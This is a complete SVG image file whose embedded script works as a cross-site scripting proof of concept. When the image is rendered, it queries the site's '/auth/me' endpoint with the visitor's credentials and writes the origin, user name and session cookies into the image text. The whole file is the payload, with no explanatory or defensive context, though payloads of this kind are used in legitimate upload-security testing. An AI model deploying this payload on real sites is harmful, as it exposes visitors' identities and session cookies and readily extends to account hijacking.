<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200"><rect width="600" height="200" fill="#06121f"/>
<text x="14" y="40" fill="#7fd1ff" font-size="15" id="o">running...</text>
<script><![CDATA[
var o=document.getElementById('o');
fetch(location.origin+'/auth/me',{credentials:'include'}).then(r=>r.json()).then(m=>{
  o.textContent='ORIGIN='+location.origin+' USER='+m.user+' COOKIE='+document.cookie;
}).catch(e=>o.textContent='ERR '+e);
]]></script></svg>